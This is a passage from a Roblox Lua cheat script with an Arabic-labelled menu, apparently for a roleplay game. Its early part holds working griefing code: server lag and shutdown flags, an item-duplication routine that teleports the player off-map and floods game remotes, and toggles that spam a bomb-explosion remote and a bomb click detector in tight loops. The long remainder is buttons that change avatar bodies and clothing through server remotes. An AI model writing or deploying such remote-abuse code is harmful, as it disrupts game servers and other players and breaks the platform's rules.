			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,-475,0)
			wait()
			lagserver = false
  end
})


Tab:AddButton({
  Name = "توقيف تقفيل السيرفر",
  Callback = function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r✅️تم ايقاف قفل السيرفر✅️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end
    
    ddos = false
		lagserver = false
		shutdownserver = false
  end
})


local Section = Tab:AddSection({"سباب قنابل/متفجرات"})


local cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")
local picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")

local function safeskripz()
    if duping then
        print("Dupe Function ")
        return true
    end

    if toolgrip == true then
        print("Tool Grip ")
        return true
    end

    return false
end

-- VariÃ¡vel global para controlar a interrupÃ§Ã£o do processo
local stopProcess = false

-- FunÃ§Ã£o para resetar o personagem
local function resetCharacter()
    local player = game.Players.LocalPlayer
    if player.Character then
        player.Character:BreakJoints()  -- Reseta o personagem
    end
end

-- FunÃ§Ã£o principal para criar paredes, chÃ£os, linhas ou cubos
local function createToolWallOrFloor(toolName, width, height, spacingX, spacingY, isFloor, isLine, isCube)
    safeskripz()

    -- Reinicia a variÃ¡vel de controle ao iniciar o processo
    stopProcess = false

    local nametools = toolName .. (isFloor and " floor lel" or (isLine and " line lel" or (isCube and " cube lel" or " wall lel")))
    local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

    -- Verifica se o personagem estÃ¡ sentado e o levanta
    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
        task.wait()
        game.Players.LocalPlayer.Character.Humanoid.Sit = false
    end

    wait(0.1)
    local args = { [1] = "ClearAllTools" }
    cleartoolremote:FireServer(unpack(args))

    -- Remove a cÃ¢mera se existir
    if game:GetService("Workspace"):FindFirstChild("Camera") then
        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
    end

    -- Teleporta o personagem para uma posiÃ§Ã£o segura
    for m = 1, 2 do
        task.wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
    end

    task.wait(0.2)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
    wait(0.3)

    local duping = true
    local iterations = isLine and width or (isCube and width * height * width or width * height)

    -- Loop de duplicaÃ§Ã£o das ferramentas
    for m = 1, iterations do
        -- Verifica se o processo foi interrompido
        if stopProcess then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            resetCharacter() -- Reseta o personagem
            return
        end

        -- Remove a cÃ¢mera se existir
        if game:GetService("Workspace"):FindFirstChild("Camera") then
            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
        end

        -- Pega a ferramenta
        local args = { [1] = "PickingTools", [2] = toolName }
        picktoolremote:InvokeServer(unpack(args))
        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolName).Parent = game.Players.LocalPlayer.Character

        -- Verifica novamente se o processo foi interrompido
        if stopProcess then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            resetCharacter() -- Reseta o personagem
            return
        end

        wait()
        game:GetService("Players").LocalPlayer.Character[toolName]:FindFirstChild("Handle").Name = "Handle"
        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolName).Parent = game.Players.LocalPlayer.Backpack
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolName).Parent = game.Players.LocalPlayer.Character

        -- Espera atÃ© que a ferramenta seja removida do personagem
        repeat
            if game:GetService("Workspace"):FindFirstChild("Camera") then
                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
            end
            wait()
        until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolName) == nil
    end

    -- Finaliza o processo
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
    repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

    local toolgrip = true
    duping = false
    wait()

    -- Posicionamento das ferramentas
    local tools = game.Players.LocalPlayer.Backpack:GetChildren()
    local baseCFrame = CFrame.new(0.0538333468, -0.264812469, -0.0177594293, 0.999998629, 0, 0.00164011808, 0, 1, 0, -0.00164011808, 0, 0.999998629)

    if isLine then
        -- Cria uma linha reta de ferramentas
        for i = 0, width - 1 do
            if tools[i + 1] then
                tools[i + 1].Grip = baseCFrame + Vector3.new(i * spacingX, spacingY, 0)
                tools[i + 1].Name = nametools
            end
        end
    elseif isCube then
        -- Cria um cubo de ferramentas
        for x = 0, width - 1 do
            for y = 0, height - 1 do
                for z = 0, width - 1 do
                    local toolIndex = x * height * width + y * width + z + 1
                    if tools[toolIndex] then
                        tools[toolIndex].Grip = baseCFrame + Vector3.new(x * spacingX, -y * spacingY, z * spacingX)
                        tools[toolIndex].Name = nametools
                    end
                end
            end
        end
    else
        -- Cria uma parede ou chÃ£o de ferramentas
        for x = 0, width - 1 do
            for y = 0, height - 1 do
                local toolIndex = x * height + y + 1
                if tools[toolIndex] then
                    if isFloor then
                        tools[toolIndex].Grip = baseCFrame + Vector3.new(x * spacingX, 0, y * spacingY)
                    else
                        tools[toolIndex].Grip = baseCFrame + Vector3.new(x * spacingX, -y * spacingY, 0)
                    end
                    tools[toolIndex].Name = nametools
                end
            end
        end
    end

    -- Retorna o personagem Ã  posiÃ§Ã£o original
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcframe
    wait(0.5)

    -- Move as ferramentas para o personagem
    for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool.Name == nametools then
            tool.Parent = game:GetService("Players").LocalPlayer.Character
        end
    end
end

local spam = false
local playerName = game.Players.LocalPlayer.Name -- pega automaticamente o nome do player local

Tab:AddToggle({
    Name = "سبام قنابل/متفجرات",
    Default = false,
    Callback = function(v)
        spam = v
        if spam then
            task.spawn(function()
                while spam do
                    local args = {
                        [1] = "Bomb" .. playerName
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Blo1wBomb1sServe1r"):FireServer(unpack(args))
                    task.wait(0.1) -- intervalo de 0.1 segundo entre cada spam
                end
            end)
        end
    end
})

local duplicarAtivo = false
local duplicarThread = nil

Tab:AddToggle({
    Name = "لاق سبام متفجرات/قنابل",
    Default = false,
    Callback = function(v)
        duplicarAtivo = v
        if duplicarAtivo then
            duplicarThread = task.spawn(function()
                local Player = game.Players.LocalPlayer
                local Character = Player.Character or Player.CharacterAdded:Wait()
                local RootPart = Character:WaitForChild("HumanoidRootPart")
                local OldPos = RootPart.CFrame

                local Bomb = game:GetService("Workspace"):FindFirstChild("WorkspaceCom")
                    and game:GetService("Workspace").WorkspaceCom["001_CriminalWeapons"]:FindFirstChild("GiveTools")
                    and game:GetService("Workspace").WorkspaceCom["001_CriminalWeapons"].GiveTools:FindFirstChild("Bomb")

                if not Bomb or not Bomb:FindFirstChild("ClickDetector") then
                    warn("Erro ao encontrar a Bomb! Tente novamente.")
                    duplicarAtivo = false
                    return
                end

                while duplicarAtivo do
                    for i = 1, 12 do
                        RootPart.CFrame = Bomb.CFrame
                        fireclickdetector(Bomb.ClickDetector)
                        task.wait(0)
                    end
                    task.wait(0.001)
                end

                -- Quando desativar, volta para a posição original
                RootPart.CFrame = OldPos
            end)
        end
    end
})

local Tab = Window:MakeTab({"الاجسام"})
local Section = Tab:AddSection({
	Name = "الارجل"
})

Tab:AddButton({ 	Name  = "رجل مقطوعه", 	Callback = function()
local args = {
            [1] = {
                [1] = 0;
                [2] = 0;
                [3] = 0;
                [4] = 139607718;
                [5] = 0;
                [6] = 1;
            };
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "رجل حديديه", 	Callback = function()
local args = {
            [1] = {
                [1] = 1;
                [2] = 1;
                [3] = 1;
                [4] = 17500249989;
                [5] = 1;
                [6] = 1;
            };
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "رجل العضام السوداء", 	Callback = function()
local args = {
            [1] = {
                [1] = 0;
                [2] = 0;
                [3] = 0;
                [4] = 14547162578;
                [5] = 0;
                [6] = 1;
            };
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "رجل العضام البيضاء", 	Callback = function()
local args = {
            [1] = {
                [1] = 0;
                [2] = 0;
                [3] = 0;
                [4] = 14580308646;
                [5] = 0;
                [6] = 1;
            };
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "رجل الرول", 	Callback = function()
local args = {
            [1] = {
                [1] = 0;
                [2] = 0;
                [3] = 0;
                [4] = 3230472745;
                [5] = 3230470862;
                [6] = 1;
            };
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "الرؤوس"
})

Tab:AddButton({ 	Name  = "راس روبوت او فضائي", 	Callback = function()
local args = {
            [1] = 3210773801;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("Wear", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "راس مخفي", 	Callback = function()
local args = {
            [1] = 134082579;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("Wear", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "راس المخفي عيون زرقاء", 	Callback = function()
 local args = {
            [1] = 16580493236;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("Wear", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "راس كوبي او رول", 	Callback = function()
local args = {
            [1] = 746767604;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("Wear", 9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "الاجسام"
})

Tab:AddButton({ 	Name  = "جسم بنت خصر صغير", 	Callback = function()
local args = {
            [1] = {
                [1] = 96491916349570;
                [2] = 76683091425509;
                [3] = 75159926897589;
                [4] = 1;
                [5] = 1;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم بنت خصر ضعيف", 	Callback = function()
local args = {
            [1] = {
                [1] = 74302534603111;
                [2] = 76683091425509;
                [3] = 75159926897589;
                [4] = 1;
                [5] = 1;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم بنت 1", 	Callback = function()
local args = {
            [1] = {
                [1] = 96491916349570;
                [2] = 14854350570;
                [3] = 14854350451;
                [4] = 1;
                [5] = 1;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم بنت 2", 	Callback = function()
local args = {
            [1] = {
                [1] = 16214246112;
                [2] = 16214249513;
                [3] = 16214251181;
                [4] = 1;
                [5] = 1;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم بنت 3", 	Callback = function()
local args = {
            [1] = {
                [1] = 15539008532;
                [2] = 15539008875;
                [3] = 15539008680;
                [4] = 15539008795;
                [5] = 15539011945;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم بنت 4", 	Callback = function()
local args = {
            [1] = {
                [1] = 14861800638;
                [2] = 14861800626;
                [3] = 14861801452;
                [4] = 14861800627;
                [5] = 14861801454;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم ولد حلو", 	Callback = function()
local args = {
            [1] = {
                [1] = 17754346388;
                [2] = 1;
                [3] = 1;
                [4] = 1;
                [5] = 1;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم ولد ضعيف", 	Callback = function()
local args = {
            [1] = {
                [1] = 92757812011061;
                [2] = 99519402284266;
                [3] = 115905570886697;
                [4] = 1;
                [5] = 1;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم ولد رول", 	Callback = function()
local args = {
            [1] = {
                [1] = 27112025;
                [2] = 27112039;
                [3] = 27112052;
                [4] = 3230472745;
                [5] = 3230470862;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم ولد كوبي", 	Callback = function()
local args = {
            [1] = {
                [1] = 86499666;
                [2] = 27112039;
                [3] = 27112052;
                [4] = 27112068;
                [5] = 27112056;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم ولد معضل", 	Callback = function()
local args = {
            [1] = {
                [1] = 18178775358;
                [2] = 18178775182;
                [3] = 18178775725;
                [4] = 18178777453;
                [5] = 18178775695;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "اجسام القزم"
})

Tab:AddButton({ 	Name  = "جسم القزم", 	Callback = function()
local args = {
            [1] = {
                [1] = 14579958702;
                [2] = 14579959062;
                [3] = 14579959191;
                [4] = 14579959249;
                [5] = 14579963667;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم القزم المتوسط", 	Callback = function()
local args = {
            [1] = {
                [1] = 77813057823038;
                [2] = 135110043370135;
                [3] = 116607813654019;
                [4] = 138966229804486;
                [5] = 128961183894053;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم القزم القصير", 	Callback = function()
local args = {
            [1] = {
                [1] = 120973199097564;
                [2] = 118345433416023;
                [3] = 112849465115864;
                [4] = 78321005147549;
                [5] = 106586789635639;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم القزم المتوسط تقريبا", 	Callback = function()
local args = {
            [1] = {
                [1] = 126267841602936;
                [2] = 77530451194918;
                [3] = 123471958406889;
                [4] = 117042768644173;
                [5] = 131948590344338;
                [6] = 1;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم الهامستر", 	Callback = function()
local args = {
            [1] = {
                [1] = 14898536974;
                [2] = 14898536957;
                [3] = 14898537277;
                [4] = 14898537300;
                [5] = 14898537292;
                [6] = 14898536975;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "اجسام غريبه"
})

Tab:AddButton({ 	Name  = "جسم روبوت", 	Callback = function()
local args = {
            [1] = {
                [1] = 14776593226;
                [2] = 14776227941;
                [3] = 14776227816;
                [4] = 102149844389538;
                [5] = 102624006545764;
                [6] = 74920391713702;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم هالك", 	Callback = function()
local args = {
            [1] = {
                [1] = 105938035513300;
                [2] = 120682289281525;
                [3] = 78459091342559;
                [4] = 119167161940457;
                [5] = 78171925423915;
                [6] = 92193892051712;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جسم كرسي", 	Callback = function()
local args = {
            [1] = {
                [1] = 16872133248;
                [2] = 16872133982;
                [3] = 16872133723;
                [4] = 16872133730;
                [5] = 16872133733;
                [6] = 134082579;
            };
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes", 9e9):WaitForChild("ChangeCharacterBody", 9e9):InvokeServer(unpack(args))
end })

local Tab = Window:MakeTab({"الملابس"})
local Section = Tab:AddSection({
	Name = "من الافضل انك تشيل الملابس قبل ما تلبس اشي"
})

Tab:AddButton({ 	Name  = "ازاله الملابس", 	Callback = function()
local args = {
    [1] = "wear",
    [2] = 2248242028
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
wait(0.1)

   local args = {
    [1] = "wear",
    [2] = 2547392639
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
wait(0.1)
end })

local Section = Tab:AddSection({
	Name = "احذية الشيطان"
})

Tab:AddButton({ 	Name  = "حذاء الشيطان الابيض", 	Callback = function()
local args = {
            [1] = 14388009243;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "حذاء الشيطان الاسود و الاحمر", 	Callback = function()
local args = {
            [1] = 14388001192;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "حذاء الشيطان الاسود", 	Callback = function()
local args = {
            [1] = 14388004031;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "شوك"
})

Tab:AddButton({ 	Name  = "شوك اسود بالذراع و الساق", 	Callback = function()
local args = {
            [1] = 17406577951;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "شوك ابيض بالذراع و الساق", 	Callback = function()
local args = {
            [1] = 17406634097;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "شوك اسود حول الجسم كامل", 	Callback = function()
local args = {
            [1] = 13463285148;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "باقات ورد"
})

Tab:AddButton({ 	Name  = "باقة ورد سوداء", 	Callback = function()
local args = {
            [1] = 12465465333;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "باقة ورد حمراء", 	Callback = function()
local args = {
            [1] = 86738633187728;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "باقة ورد وردية", 	Callback = function()
local args = {
            [1] = 12465478536;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "باقة ورد بيضاء", 	Callback = function()
local args = {
            [1] = 72175664063418;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "ضمادات الذراع"
})

Tab:AddButton({ 	Name  = "ضمادات الذراع لون اسود", 	Callback = function()
local args = {
            [1] = 11456892689;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "ضمادات الذراع لون ابيض", 	Callback = function()
local args = {
            [1] = 11458078735;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "قفازات اليد"
})

Tab:AddButton({ 	Name  = "قفازات طويله لون اسود", 	Callback = function()
local args = {
            [1] = 14663501859;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات قصيره لون اسود", 	Callback = function()
local args = {
            [1] = 14915193711;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات طويله لون احمر", 	Callback = function()
local args = {
            [1] = 15209194774;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات طويله لون ابيض", 	Callback = function()
local args = {
            [1] = 10789933479;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات قصيره لون ابيض", 	Callback = function()
local args = {
            [1] = 15066901505;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات طويله لون ازرق", 	Callback = function()
local args = {
            [1] = 10789945803;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات قصيره لون ازرق", 	Callback = function()
local args = {
            [1] = 10714157708;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات طويله لون وردي", 	Callback = function()
local args = {
            [1] = 10789939838;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات قصيره لون وردي", 	Callback = function()
local args = {
            [1] = 17775444165;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات طويله لون اخضر", 	Callback = function()
local args = {
            [1] = 13233318125;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات قصيره لون اخضر", 	Callback = function()
local args = {
            [1] = 10713817180;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفاز غريب", 	Callback = function()
local args = {
            [1] = 12175951307;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات حمراء مخططه لون ابيض", 	Callback = function()
local args = {
            [1] = 14687547890;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات تتناسب على البنت او الولد", 	Callback = function()
local args = {
            [1] = 106701020164834;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات ورديه للبنات", 	Callback = function()
local args = {
            [1] = 16030963309;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات سوداء حلوه", 	Callback = function()
local args = {
            [1] = 12368927792;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات بيضاء حلوه", 	Callback = function()
local args = {
            [1] = 12368919975;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات خضراء حلوه", 	Callback = function()
local args = {
            [1] = 12368854118;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات مخططه اسود و احمر", 	Callback = function()
local args = {
            [1] = 14758885890;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "قفازات مخططه ابيض و اسود", 	Callback = function()
local args = {
            [1] = 14758885890;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "جاكيتات"
})

Tab:AddButton({ 	Name  = "جاكيت اسود مفتوح", 	Callback = function()
local args = {
            [1] = 9048321833;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جاكيت اسود هيكل عظمي مفتوح", 	Callback = function()
local args = {
            [1] = 15154273975;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جاكيت اسود و ابيض مفتوح", 	Callback = function()
local args = {
            [1] = 9122099141;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جاكيت ابيض مفتوح", 	Callback = function()
local args = {
            [1] = 11247067714;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جاكيت اسود مفتوح حلو", 	Callback = function()
local args = {
            [1] = 9132711224;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Section = Tab:AddSection({
	Name = "جاكيتات بنات"
})

Tab:AddButton({ 	Name  = "جاكيت اسود مفتوح حلو", 	Callback = function()
local args = {
            [1] = 14849843673;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جاكيت احمر مفتوح", 	Callback = function()
local args = {
            [1] = 18623320140;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جاكيت احمر و اسود", 	Callback = function()
local args = {
            [1] = 17833109917;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "جاكيت قصير احمر مفتوح", 	Callback = function()
local args = {
            [1] = 109964869516145;
        }
